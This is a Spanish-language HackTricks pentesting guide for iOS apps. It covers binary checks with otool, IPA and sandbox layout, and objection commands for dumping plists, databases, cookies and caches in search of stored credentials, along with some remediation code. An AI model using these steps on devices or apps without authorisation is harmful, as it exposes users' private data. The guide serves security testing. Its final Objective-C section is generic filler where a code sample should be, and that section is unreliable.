# iOS Pentesting

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Utilice [**Trickest**](https://trickest.io/) para construir y automatizar f√°cilmente flujos de trabajo con las herramientas de la comunidad m√°s avanzadas del mundo.\
Obtenga acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Fundamentos de iOS

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Entorno de Pruebas

En esta p√°gina puedes encontrar informaci√≥n sobre el **simulador de iOS**, **emuladores** y **jailbreaking**:

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## An√°lisis Inicial

### Operaciones B√°sicas de Pruebas en iOS

Durante las pruebas se sugerir√°n **varias operaciones** (conectar al dispositivo, leer/escribir/subir/descargar archivos, usar algunas herramientas...). Por lo tanto, si no sabes c√≥mo realizar alguna de estas acciones, por favor, **comienza leyendo la p√°gina**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Para los siguientes pasos, **la aplicaci√≥n debe estar instalada** en el dispositivo y ya se debe haber obtenido el **archivo IPA** de la aplicaci√≥n.\
Lee la p√°gina [Operaciones B√°sicas de Pruebas en iOS](basic-ios-testing-operations.md) para aprender c√≥mo hacer esto.
{% endhint %}

### An√°lisis Est√°tico B√°sico

Se recomienda utilizar la herramienta [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) para realizar un an√°lisis est√°tico autom√°tico del archivo IPA.

Identificaci√≥n de **protecciones presentes en el binario**:

*   **PIE (Ejecutable Independiente de la Posici√≥n)**: Cuando est√° habilitado, la aplicaci√≥n se carga en una direcci√≥n de memoria aleatoria cada vez que se inicia, lo que dificulta predecir su direcci√≥n de memoria inicial.

```
otool -hv <app-binary> | grep PIE   # Deber√≠a incluir la marca PIE
```
*   **Canarios de Pila**: Para validar la integridad de la pila, se coloca un valor 'canario' en la pila antes de llamar a una funci√≥n y se valida nuevamente una vez que la funci√≥n termina.

```
otool -I -v <app-binary> | grep stack_chk   # Deber√≠a incluir los s√≠mbolos: stack_chk_guard y stack_chk_fail
```
*   **ARC (Conteo Autom√°tico de Referencias)**: Para prevenir fallas comunes de corrupci√≥n de memoria

```
otool -I -v <app-binary> | grep objc_release   # Deber√≠a incluir el s√≠mbolo _objc_release
```
*   **Binario Encriptado**: El binario debe estar encriptado

```
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # El cryptid deber√≠a ser 1
```

**Identificaci√≥n de Funciones Sensibles/Inseguras**

*   **Algoritmos de Hash D√©biles**

```
# En el dispositivo iOS
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# En Linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Funciones Aleatorias Inseguras**

```
# En el dispositivo iOS
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# En Linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Funci√≥n 'Malloc' Insegura**

```
# En el dispositivo iOS
otool -Iv <app> | grep -w "_malloc"

# En Linux
grep -iER "_malloc"
```
*   **Funciones Inseguras y Vulnerables**

```
# En el dispositivo iOS
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# En Linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```
### An√°lisis Din√°mico B√°sico

Echa un vistazo al an√°lisis din√°mico que realiza [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF). Deber√°s navegar por las diferentes vistas e interactuar con ellas, pero el programa enganchar√° varias clases y realizar√° otras acciones, y al final generar√° un informe.

### Listado de Aplicaciones Instaladas

Cuando te dirijas a las aplicaciones instaladas en el dispositivo, primero tendr√°s que averiguar el identificador de paquete correcto de la aplicaci√≥n que deseas analizar. Puedes utilizar `frida-ps -Uai` para obtener todas las aplicaciones (`-a`) actualmente instaladas (`-i`) en el dispositivo USB conectado (`-U`):
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Enumeraci√≥n b√°sica y Hooking

Aprende c√≥mo **enumerar los componentes de la aplicaci√≥n** y c√≥mo **enganchar f√°cilmente m√©todos y clases** con objection:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### Estructura de IPA

Los archivos `.ipa` son **paquetes comprimidos**, por lo que puedes cambiar la extensi√≥n a `.zip` y **descomprimirlos**. Una aplicaci√≥n **empaquetada completa** lista para ser instalada se conoce com√∫nmente como un **Bundle**.\
Despu√©s de descomprimirlos, deber√≠as ver `<NOMBRE>.app`, un archivo comprimido que contiene el resto de los recursos.

* `Info.plist`: Un archivo que contiene algunas de las configuraciones espec√≠ficas de la aplicaci√≥n.
* `_CodeSignature/` contiene un archivo plist con una firma sobre todos los archivos en el bundle.
* `Assets.car`: Otro archivo comprimido que contiene recursos (iconos).
* `Frameworks/` contiene las bibliotecas nativas de la aplicaci√≥n como archivos .dylib o .framework.
* `PlugIns/` puede contener extensiones de la aplicaci√≥n como archivos .appex (no presentes en el ejemplo).
* [`Core Data`](https://developer.apple.com/documentation/coredata): Se utiliza para guardar los datos permanentes de tu aplicaci√≥n para su uso sin conexi√≥n, para almacenar datos temporales en cach√© y para agregar funcionalidad de deshacer a tu aplicaci√≥n en un solo dispositivo. Para sincronizar datos en varios dispositivos en una sola cuenta de iCloud, Core Data refleja autom√°ticamente tu esquema en un contenedor de CloudKit.
* [`PkgInfo`](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): El archivo `PkgInfo` es una forma alternativa de especificar los c√≥digos de tipo y creador de tu aplicaci√≥n o bundle.
* **en.lproj, fr.proj, Base.lproj**: Son los paquetes de idioma que contienen recursos para esos idiomas espec√≠ficos y un recurso predeterminado en caso de que no se admita un idioma.

Hay varias formas de definir la interfaz de usuario en una aplicaci√≥n iOS: archivos _storyboard_, _nib_ o _xib_.

**Info.plist**

La lista de propiedades de informaci√≥n o `Info.plist` es la principal fuente de informaci√≥n para una aplicaci√≥n iOS. Consiste en un archivo estructurado que contiene pares de **clave-valor** que describen informaci√≥n de configuraci√≥n esencial sobre la aplicaci√≥n. En realidad, se espera que todos los ejecutables empaquetados (extensiones de la aplicaci√≥n, frameworks y aplicaciones) tengan un archivo `Info.plist`. Puedes encontrar todas las claves posibles en la [**Documentaci√≥n para desarrolladores de Apple**](https://developer.apple.com/documentation/bundleresources/information\_property\_list?language=objc).

El archivo puede estar formateado en formato **XML o binario (bplist)**. Puedes **convertirlo a formato XML** con un simple comando:

*   En macOS con `plutil`, que es una herramienta que viene de forma nativa con macOS 10.2 y versiones superiores (actualmente no hay documentaci√≥n oficial en l√≠nea disponible):

```bash
$ plutil -convert xml1 Info.plist
```
*   En Linux:

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```

Aqu√≠ tienes una lista no exhaustiva de algunas informaciones y las palabras clave correspondientes que puedes buscar f√°cilmente en el archivo `Info.plist` simplemente inspeccionando el archivo o usando `grep -i <palabra clave> Info.plist`:

* Cadenas de prop√≥sito de permisos de la aplicaci√≥n: `UsageDescription`
* Esquemas de URL personalizados: `CFBundleURLTypes`
* Tipos de documentos personalizados exportados/importados: `UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`
* Configuraci√≥n de Seguridad de Transporte de Aplicaci√≥n (ATS): `NSAppTransportSecurity`

Consulta los cap√≠tulos mencionados para obtener m√°s informaci√≥n sobre c√≥mo probar cada uno de estos puntos.

**Rutas de datos**

En iOS, las aplicaciones del sistema se pueden encontrar en el directorio `/Applications`, mientras que las aplicaciones instaladas por el usuario est√°n disponibles en `/private/var/containers/`. Sin embargo, encontrar la carpeta correcta solo navegando por el sistema de archivos no es una tarea trivial, ya que a cada aplicaci√≥n se le asigna un UUID (Identificador √önico Universal) de 128 bits aleatorio para los nombres de sus directorios.

Para obtener f√°cilmente la informaci√≥n del directorio de instalaci√≥n de las aplicaciones instaladas por el usuario, puedes usar el comando `env` de objection, que tambi√©n te mostrar√° toda la informaci√≥n del directorio de la aplicaci√≥n:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Como puedes ver, las aplicaciones tienen dos ubicaciones principales:

* El **directorio Bundle** (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/`).
* El **directorio de Datos** (`/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/`).

Estas carpetas contienen informaci√≥n que debe ser examinada detenidamente durante las evaluaciones de seguridad de la aplicaci√≥n (por ejemplo, al analizar los datos almacenados en busca de datos sensibles).

**Directorio Bundle:**

* **AppName.app**
* Este es el paquete de la aplicaci√≥n como se ve antes en el IPA, contiene datos esenciales de la aplicaci√≥n, contenido est√°tico y el binario compilado de la aplicaci√≥n.
* Este directorio es visible para los usuarios, pero **los usuarios no pueden escribir en √©l**.
* El contenido de este directorio **no se respalda**.
* El contenido de esta carpeta se utiliza para **validar la firma del c√≥digo**.

**Directorio de Datos:**

* **Documents/**
* Contiene todos los datos generados por el usuario. El usuario final de la aplicaci√≥n inicia la creaci√≥n de estos datos.
* Visible para los usuarios y **los usuarios pueden escribir en √©l**.
* El contenido de este directorio **se respalda**.
* La aplicaci√≥n puede deshabilitar rutas estableciendo `NSURLIsExcludedFromBackupKey`.
* **Library/**
* Contiene todos los **archivos que no son espec√≠ficos del usuario**, como **cach√©s**, **preferencias**, **cookies** y archivos de configuraci√≥n de listas de propiedades (plist).
* Las aplicaciones de iOS suelen utilizar los subdirectorios `Application Support` y `Caches`, pero la aplicaci√≥n puede crear subdirectorios personalizados.
* **Library/Caches/**
* Contiene archivos en cach√© **semipersistentes**.
* Invisible para los usuarios y **los usuarios no pueden escribir en √©l**.
* El contenido de este directorio **no se respalda**.
* El sistema operativo puede eliminar autom√°ticamente los archivos de este directorio cuando la aplicaci√≥n no se est√° ejecutando y el espacio de almacenamiento es escaso.
* **Library/Application Support/**
* Contiene archivos **persistentes** necesarios para ejecutar la aplicaci√≥n.
* **Invisible** para los usuarios y los usuarios no pueden escribir en √©l.
* El contenido de este directorio **se respalda**.
* La aplicaci√≥n puede deshabilitar rutas estableciendo `NSURLIsExcludedFromBackupKey`.
* **Library/Preferences/**
* Se utiliza para almacenar propiedades que pueden **persistir incluso despu√©s de reiniciar la aplicaci√≥n**.
* La informaci√≥n se guarda sin cifrar dentro del sandbox de la aplicaci√≥n en un archivo plist llamado \[BUNDLE\_ID].plist.
* Todos los pares clave/valor almacenados usando `NSUserDefaults` se pueden encontrar en este archivo.
* **tmp/**
* Utiliza este directorio para escribir archivos **temporales** que no necesitan persistir entre lanzamientos de la aplicaci√≥n.
* Contiene archivos en cach√© no persistentes.
* **Invisible** para los usuarios.
* El contenido de este directorio no se respalda.
* El sistema operativo puede eliminar autom√°ticamente los archivos de este directorio cuando la aplicaci√≥n no se est√° ejecutando y el espacio de almacenamiento es escaso.

Echemos un vistazo m√°s de cerca al directorio de paquetes de la aplicaci√≥n (.app) de iGoat-Swift dentro del directorio Bundle (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Reversi√≥n binaria

Dentro de la carpeta `<nombre-de-la-aplicaci√≥n>.app` encontrar√°s un archivo binario llamado `<nombre-de-la-aplicaci√≥n>`. Este es el archivo que se **ejecutar√°**. Puedes realizar una inspecci√≥n b√°sica del binario con la herramienta **`otool`**:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**Verificar si la aplicaci√≥n est√° encriptada**

Verificar si hay alguna salida para:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Desensamblar el binario**

Desensamblar la secci√≥n de texto:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Para imprimir el **segmento Objective-C** de la aplicaci√≥n de muestra, se puede utilizar:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Para obtener un c√≥digo Objective-C m√°s compacto, puedes usar [**class-dump**](http://stevenygard.com/projects/class-dump/):
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Sin embargo, las mejores opciones para desensamblar el binario son: [**Hopper**](https://www.hopperapp.com/download.html?) y [**IDA**](https://www.hex-rays.com/products/ida/support/download\_freeware/).

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Utiliza [**Trickest**](https://trickest.io/) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias m√°s avanzadas del mundo.\
Obt√©n acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Almacenamiento de datos

Para aprender c√≥mo iOS almacena datos en el dispositivo, lee esta p√°gina:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Los siguientes lugares para almacenar informaci√≥n deben ser verificados **justo despu√©s de instalar la aplicaci√≥n**, **despu√©s de verificar todas las funcionalidades** de la aplicaci√≥n e incluso despu√©s de **cerrar sesi√≥n de un usuario y acceder con otro**.\
El objetivo es encontrar **informaci√≥n sensible no protegida** de la aplicaci√≥n (contrase√±as, tokens), del usuario actual y de usuarios que hayan iniciado sesi√≥n anteriormente.
{% endhint %}

### Plist

Los archivos **plist** son archivos XML estructurados que **contienen pares clave-valor**. Es una forma de almacenar datos persistentes, por lo que a veces puedes encontrar **informaci√≥n sensible en estos archivos**. Se recomienda verificar estos archivos despu√©s de instalar la aplicaci√≥n y despu√©s de usarla intensivamente para ver si se escriben nuevos datos.

La forma m√°s com√∫n de persistir datos en archivos plist es a trav√©s del uso de **NSUserDefaults**. Este archivo plist se guarda dentro del sandbox de la aplicaci√≥n en **`Library/Preferences/<appBundleID>.plist`**

La clase [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) proporciona una interfaz program√°tica para interactuar con el sistema predeterminado. El sistema predeterminado permite que una aplicaci√≥n personalice su comportamiento seg√∫n las **preferencias del usuario**. Los datos guardados por `NSUserDefaults` se pueden ver en el paquete de la aplicaci√≥n. Esta clase almacena **datos** en un **archivo plist**, pero est√° destinada a ser utilizada con peque√±as cantidades de datos.

Estos datos no se pueden acceder directamente a trav√©s de una computadora de confianza, pero se pueden acceder realizando una **copia de seguridad**.

Puedes **volcar** la informaci√≥n guardada utilizando **`NSUserDefaults`** utilizando el comando `ios nsuserdefaults get` de objection.

Para encontrar todos los archivos plist utilizados por la aplicaci√≥n, puedes acceder a `/private/var/mobile/Containers/Data/Application/{APPID}` y ejecutar:
```bash
find ./ -name "*.plist"
```
El archivo puede estar formateado en **XML o binario (bplist)**. Puedes **convertirlo a formato XML** con un simple comando:

*   En macOS con `plutil`, que es una herramienta que viene de forma nativa con macOS 10.2 y versiones superiores (actualmente no hay documentaci√≥n oficial en l√≠nea disponible):

```bash
$ plutil -convert xml1 Info.plist
```
*   En Linux:

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
*   En una sesi√≥n de objection:

```bash
ios plist cat /private/var/mobile/Containers/Data/Application/AF1F534B-1B8F-0825-ACB21-C0301AB7E56D/Library/Preferences/com.some.package.app.plist
```

### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple\_ref/doc/uid/TP40001075-CH8-SW1) es un marco para administrar la capa de modelo de objetos en tu aplicaci√≥n. [Core Data puede usar SQLite como su almacenamiento persistente](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), pero el marco en s√≠ no es una base de datos.\
CoreData no encripta sus datos de forma predeterminada. Sin embargo, se puede agregar una capa adicional de encriptaci√≥n a CoreData. Consulta el [Repositorio de GitHub](https://github.com/project-imas/encrypted-core-data) para obtener m√°s detalles.

Puedes encontrar la informaci√≥n de SQLite Core Data de una aplicaci√≥n en la ruta `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Si puedes abrir el SQLite y acceder a informaci√≥n sensible, entonces has encontrado una mala configuraci√≥n.**

{% code title="C√≥digo de iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) es un almac√©n de clave/valor construido sobre SQLite.\
Como las bases de datos Yap son bases de datos sqlite, puedes encontrarlas usando el comando propuesto en la secci√≥n anterior.

### Otras bases de datos SQLite

Es com√∫n que las aplicaciones creen su propia base de datos sqlite. Pueden estar almacenando datos sensibles en ellas y dej√°ndolos sin cifrar. Por lo tanto, siempre es interesante verificar cada base de datos dentro del directorio de aplicaciones. Por lo tanto, ve al directorio de la aplicaci√≥n donde se guardan los datos (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Bases de datos en tiempo real de Firebase

Puede ser aprovechado por los desarrolladores de aplicaciones para **almacenar y sincronizar datos con una base de datos en la nube sin SQL**. Los datos se almacenan como JSON y se sincronizan en tiempo real con cada cliente conectado y tambi√©n permanecen disponibles incluso cuando la aplicaci√≥n est√° sin conexi√≥n.

Puedes encontrar c√≥mo verificar bases de datos de Firebase mal configuradas aqu√≠:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Bases de datos de Realm

[Realm Objective-C](https://realm.io/docs/objc/latest/) y [Realm Swift](https://realm.io/docs/swift/latest/) no son suministrados por Apple, pero a√∫n as√≠ vale la pena mencionarlos. **Almacenan todo sin cifrar, a menos que la configuraci√≥n tenga el cifrado habilitado**.

Puedes encontrar estas bases de datos en `/private/var/mobile/Containers/Data/Application/{APPID}`.
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Puedes utilizar la herramienta [**Realm Studio**](https://github.com/realm/realm-studio) para abrir estos archivos de base de datos.

El siguiente ejemplo muestra c√≥mo utilizar el cifrado con una base de datos de Realm:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Bases de datos de Couchbase Lite

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) es un motor de base de datos ligero, integrado y orientado a documentos (NoSQL) que se puede sincronizar. Se compila nativamente para iOS y macOS.

Verifique posibles bases de datos de Couchbase en `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/`

### Cookies

iOS almacena las cookies de las aplicaciones en **`Library/Cookies/cookies.binarycookies`** dentro de la carpeta de cada aplicaci√≥n. Sin embargo, a veces los desarrolladores deciden guardarlas en el **llavero** ya que el mencionado **archivo de cookies puede ser accedido en las copias de seguridad**.

Para inspeccionar el archivo de cookies, puedes usar [**este script de Python**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) o usar el comando **`ios cookies get`** de Objection.\
**Tambi√©n puedes usar Objection para** convertir estos archivos a formato JSON e inspeccionar los datos.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Cach√©

Por defecto, NSURLSession almacena datos, como las solicitudes y respuestas HTTP, en la base de datos Cache.db. Esta base de datos puede contener datos sensibles, como tokens, nombres de usuario u otra informaci√≥n confidencial que se haya almacenado en cach√©. Para encontrar la informaci√≥n almacenada en cach√©, abre el directorio de datos de la aplicaci√≥n (`/var/mobile/Containers/Data/Application/<UUID>`) y ve a `/Library/Caches/<Bundle Identifier>`. La cach√© de WebKit tambi√©n se almacena en el archivo Cache.db. Objection puede abrir e interactuar con la base de datos con el comando `sqlite connect Cache.db`, ya que es una base de datos SQLite normal.

Se recomienda desactivar el almacenamiento en cach√© de estos datos, ya que pueden contener informaci√≥n sensible en la solicitud o respuesta. La siguiente lista muestra diferentes formas de lograr esto:

1. Se recomienda eliminar las respuestas almacenadas en cach√© despu√©s de cerrar sesi√≥n. Esto se puede hacer con el m√©todo proporcionado por Apple llamado [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses). Puedes llamar a este m√©todo de la siguiente manera:

`URLCache.shared.removeAllCachedResponses()`

Este m√©todo eliminar√° todas las solicitudes y respuestas almacenadas en cach√© del archivo Cache.db.
2. Si no necesitas utilizar las ventajas de las cookies, se recomienda utilizar la propiedad de configuraci√≥n [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) de URLSession, que desactivar√° el almacenamiento de cookies y cach√©s.

[Documentaci√≥n de Apple](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Un objeto de configuraci√≥n de sesi√≥n ef√≠mera es similar a una configuraci√≥n de sesi√≥n predeterminada (ver default), excepto que el objeto de sesi√≥n correspondiente no almacena cach√©s, almacenes de credenciales ni ning√∫n dato relacionado con la sesi√≥n en el disco. En su lugar, los datos relacionados con la sesi√≥n se almacenan en la RAM. La √∫nica vez que una sesi√≥n ef√≠mera escribe datos en el disco es cuando le indicas que escriba el contenido de una URL en un archivo.`
3. La cach√© tambi√©n se puede desactivar estableciendo la pol√≠tica de cach√© en [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). Esto desactivar√° el almacenamiento de la cach√© de cualquier manera, ya sea en memoria o en disco.

### Capturas de pantalla

Cada vez que presionas el bot√≥n de inicio, iOS toma una captura de pantalla de la pantalla actual para poder hacer la transici√≥n a la aplicaci√≥n de una manera m√°s suave. Sin embargo, si hay datos sensibles en la pantalla actual, se guardar√°n en la imagen (que persiste incluso despu√©s de reiniciar el dispositivo). Estas son las capturas de pantalla a las que tambi√©n se puede acceder al hacer doble clic en la pantalla de inicio para cambiar entre aplicaciones.

A menos que el iPhone est√© con jailbreak, el atacante necesita tener acceso al dispositivo desbloqueado para ver estas capturas de pantalla. Por defecto, la √∫ltima captura de pantalla se almacena en el sandbox de la aplicaci√≥n en la carpeta `Library/Caches/Snapshots/` o `Library/SplashBoard/Snapshots` (los equipos de confianza no pueden acceder al sistema de archivos a partir de iOS 7.0).

Una forma de prevenir este comportamiento no deseado es poner una pantalla en blanco o eliminar los datos sensibles antes de tomar la captura de pantalla utilizando la funci√≥n `ApplicationDidEnterBackground()`.

A continuaci√≥n se muestra un ejemplo de un m√©todo de remediaci√≥n que establecer√° una captura de pantalla predeterminada.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-C:

Objective-C es un lenguaje de programaci√≥n utilizado para desarrollar aplicaciones en iOS. Es un lenguaje orientado a objetos que se basa en el lenguaje C. Objective-C es ampliamente utilizado para desarrollar aplicaciones nativas de iOS y ofrece una amplia gama de funcionalidades y bibliotecas para facilitar el desarrollo de aplicaciones.

